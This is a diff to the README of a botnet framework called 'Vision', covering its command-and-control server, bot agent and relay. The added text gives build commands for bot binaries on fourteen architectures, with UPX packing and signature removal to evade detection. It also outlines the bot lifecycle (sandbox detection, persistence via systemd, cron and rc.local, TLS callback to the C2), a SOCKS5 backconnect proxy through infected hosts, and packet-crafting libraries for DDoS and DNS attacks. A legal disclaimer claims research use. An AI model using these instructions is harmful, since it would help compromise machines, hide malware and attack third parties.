@@ -125,6 +125,34 @@ Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)
 
 ---
 
+```bash
+# Full interactive setup (generates crypto, patches config, builds everything)
+python3 setup.py
+
+# Build CNC server only
+go build -trimpath -ldflags="-s -w -buildid=" -o server ./cnc
+
+# Build single bot binary (e.g. amd64)
+GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w -buildid=" -o bins/ethd0 ./bot
+
+# Cross-compile all 14 bot architectures (with strip + UPX + signature removal)
+cd tools && ./build.sh
+
+# Verify encrypted config blobs are valid
+go run tools/crypto.go verify
+
+# Encrypt/decrypt strings for config
+go run tools/crypto.go encrypt "string"
+go run tools/crypto.go decrypt <hex>
+
+# Build relay server (deploy on separate VPS)
+go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay
+
+# Run relay (must match bot's syncToken / CNC MAGIC_CODE)
+./relay -key <magic_code> -cp 9001 -sp 1080
+
+```
+
 ## 🎨 TUI Navigation
 
 | Key | Action |
@@ -144,16 +172,17 @@ Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)
 - **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
 - **📜 Connection Logs** — Bot connect/disconnect history
 
-
 ---
 
 ## Architecture
 
-Vision has two components:
+**Bot lifecycle:** decrypt config → daemonize → singleton lock → sandbox detect → persistence (systemd/cron/rc.local) → DNS resolve C2 → TLS connect → auth (HMAC challenge-response) → command loop with auto-reconnect.
 
-**`cnc/`** — The Command & Control server. Dual-listener: TLS on 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`.
+**CNC modes:** TUI (`cnc/ui.go`, ~3400 lines, Bubble Tea) or split/telnet CLI (`cnc/cmd.go`). RBAC with 4 tiers: Basic/Pro/Admin/Owner.
 
-**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → singleton lock → environment detection → install persistence → DNS-resolve C2 → connect with reconnect loop.
+**Bot-CNC protocol:** TLS 1.2+ on port 443. HMAC auth using `magicCode`. Bot sends `REGISTER:version:botID:arch:RAM:CPU:procName:uplink`. Commands/responses are plaintext over TLS. Keepalive: PING/PONG every 60s, stale cleanup after 5min.
+
+**SOCKS5 backconnect proxy:** Bot connects OUT to a relay server (`relay/`) via TLS. Relay has two ports: control (for bots, TLS) and SOCKS5 (for clients, plaintext). When a SOCKS5 client connects to the relay, the relay signals the bot over the control channel, bot opens a new data connection, and runs the SOCKS5 protocol through the relay tunnel. C2 address is never exposed — relay is separate infrastructure. Relay endpoints can be pre-configured at build time via `setup.py` or specified at runtime via `!socks <relay:port>`.
 
 ---
 
@@ -168,6 +197,14 @@ Vision has two components:
 
 ---
 
+## Key Dependencies
+
+- `github.com/charmbracelet/bubbletea` — TUI framework (CNC)
+- `github.com/google/gopacket` — raw packet crafting (L4 attacks)
+- `github.com/miekg/dns` — DNS protocol (C2 resolution, DNS attacks)
+- External: `upx` (binary compression), `python3` (setup wizard), `openssl` (cert generation)
+
+  
 ## Legal Disclaimer
 
 **For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.
